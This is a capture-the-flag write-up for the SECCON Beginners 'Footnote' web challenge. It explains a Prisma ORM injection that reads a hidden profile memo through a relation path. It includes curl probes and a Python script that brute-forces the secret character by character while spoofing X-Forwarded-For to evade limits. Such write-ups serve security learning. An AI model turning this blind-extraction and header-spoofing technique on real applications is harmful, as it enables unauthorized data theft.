---
title: SECCON Beginners 2026
date: 2024-8-11 13:10:30 +0000
categories: [CTFS]
tags: [CTFS]
math: true
mermaid: true
media_subpath: /assets/posts/ctfs/SECCON26
image:
  path: preview.png
---
-------------

### SECCON BEGINNERS 26 

--------------

<img width="1218" height="565" alt="image" src="https://github.com/user-attachments/assets/7f6fc758-62f2-4354-a4c2-6e386bc36723" />


--------------

### Web->Footnote

--------------

<img width="467" height="677" alt="image" src="https://github.com/user-attachments/assets/eff9c8c8-3188-43fa-a836-9942360fc85e" />

-------------

- Files-:

<img width="535" height="510" alt="image" src="https://github.com/user-attachments/assets/30bb9e03-16e8-46f6-99f2-7e0a3a6f1f3c" />

- We have an `Express` api using `PRISMA` orm to interact with the database. ORM is known as the `Obhects Relational Mapping` which defeats the idea of using traditional sql queries to interact with databases but with the aid of object relational programming.Prisma is good example of ORM and it is used in this instance
- Example of ORM code instead of traditional sql query-:

```javascript
 await prisma.user.findMany({
    include: {
      posts: true,
    },
  })
```
- ORM injection is an issues that affects prisma statements when a developer allows user to control objects in a prisma statement. Sink in this code-:

```typescript
try {
    const filterWhere = isAdvancedSearch({
      field: req.query.field,
      op: req.query.op,
      value: req.query.value,
    })
      ? buildAdvancedWhere({
          field: req.query.field,
          op: req.query.op,
          value: req.query.value,
        })
      : buildKeywordWhere(req.query.q);
//Attacker can control fields, operation and value
    const articles = await prisma.article.findMany({
      where: {
        AND: [{ published: true }, filterWhere],
      },
      orderBy: { id: "asc" },
      select: articleSelect,
    });

```
- In the code above, an attacker can control the field, operation and value allowing us to read sensitve data in the database.

------------

### Bypassing the filters in function `isAdvancedSearch`

-------------

- I noticed a `filter.ts` in the code which provides the method `isAdvancedSearch`.

```typescript
const ALLOWED_FILTER_ROOTS = new Set(["title", "body", "author"]);
const ALLOWED_OPERATORS = new Set(["eq", "contains", "startsWith"]);
const TO_ONE_RELATIONS = new Set(["author", "profile"]);
```

- The filters restrict the user to certain rules-:
 - Field roots can only start with `title`,`body`,`author`.
 - Allowed operators are `eq`,`contains` and `startsWith`
 - Lastly, in Prisma, a To-One relation (or One-to-One relation) connects one record in a database table to exactly one record in another database table.Using the `schema.prisma`-:

```
generator client {
  provider = "prisma-client"
  output   = "../src/generated/prisma"
}

datasource db {
  provider = "sqlite"
}

model User {
  id       Int       @id @default(autoincrement())
  name     String    @unique
  role     String
  profile  Profile?
  articles Article[]
}

model Profile {
  id         Int    @id @default(autoincrement())
  displayName String
  bio        String
  secretMemo String
  userId     Int    @unique
  user       User   @relation(fields: [userId], references: [id])
}

model Article {
  id        Int     @id @default(autoincrement())
  title     String  @unique
  body      String
  published Boolean @default(true)
  authorId  Int
  author    User    @relation(fields: [authorId], references: [id])

  @@index([published])
}

```

- The record pointed to by the function `findMany` is `Article`, we can only read a field from another model with the aid of `To-One` relations  because the field created in the model points to another field in a different field which allows us to also point to another field in that model.e.g

>If we are to read field `secretMemo` in model `Profile` from model `Article`.
>It will be from field `author` as it references `id` in `User`.
>Then, point to `profile` which inherits the model `Profile` and lastly point to `secretMemo` which is a `string` field in model `Profile`.

```prisma
author.profile.secretMemo
```
- After accessing the field, we can predict values with `startsWith` and fuzz for characters with that operator.We can also confirm with `eq` which is `eqauls`to confirm if the found characters are correct.The next step is to get the result for true and false statements in order to write a script.
- A true conditon returns 2 articles.-:

```sh
╭─   ~/Documents/footnote                                                                                                                                                 at  19:17:48 ─╮
╰─❯ curl http://footnote.beginners.seccon.games:44566/api/articles/search\?field\=author.profile.secretMemo\&op\=startsWith\&value\=b                                                     ─╯
{"count":2,"articles":[{"id":1,"title":"朝の図書室から","body":"開館前の図書室には、まだ誰の足音もありません。窓際の机に光が差し込み、昨日返された本の背表紙だけが静かに並んでいます。棚を整えていると、誰かが挟んだ古いしおりが見つかりました。","author":{"profile":{"displayName":"admin","bio":"編集長。記事の裏側にある小さなメモを管理している。"}}},{"id":4,"title":"古い掲示板の手紙","body":"公民館の入口にある掲示板には、何年も変わらない画鋲の跡があります。新しいお知らせの隅に残った日焼けの形を見ると、ここで何度も季節が入れ替わったことが分かります。","author":{"profile":{"displayName":"admin","bio":"編集長。記事の裏側にある小さなメモを管理している。"}}}]}%
```

- A false condition returns 0 articles-:

```sh
─   ~/Documents/footnote                                                                                                                                                 at  19:18:42 ─╮
╰─❯ curl http://footnote.beginners.seccon.games:44566/api/articles/search\?field\=author.profile.secretMemo\&op\=startsWith\&value\=f                                                     ─╯
{"count":0,"articles":[]}%                                                                                                                    
```

- Script-:

```python
#! /usr/bin/env python3
import requests
import string
from faker import Faker

faker =  Faker()
url = "http://footnote.beginners.seccon.games:44566/api/articles/search"
secret =  ""
charset = '0123456789abcdefghijklmnopqrstuvwxyz'

def check_secret(secret:  str,ip: str):
    data  =  {"field":"author.profile.secretMemo","op":"eq","value":secret}
    count  = requests.get(url,params=data,headers={"X-Forwarded-For":ip}).json()
    if  count["count"] ==  2:
        return True
    else:
        return False
while True:
    for char in charset:
        random_ip = faker.ipv4()
        data =  {"field":"author.profile.secretMemo","op":"startsWith","value":secret+char}
        count = requests.get(url,params=data,headers={"X-Forwarded-For":random_ip}).json()
        #print(f"Char::{char}:{count["count"]}")
        if  count["count"] == 2:
            secret += char
            print("[+] Found char:"+secret)
        if  check_secret(secret,random_ip):
            print("[+]  Secret found-: ",secret)
            print("[+] Flag->  ",requests.post("http://footnote.beginners.seccon.games:44566/api/claim",json={"memo":secret}).json()["flag"])
            exit()
        else: 
            pass
```
- Flag-: ```ctf4b{r00t_f13lds_4r3_n0t_en0ugh}```

<img width="706" height="326" alt="image" src="https://github.com/user-attachments/assets/65ba5a88-63b4-4692-b23c-2cdee5901303" />
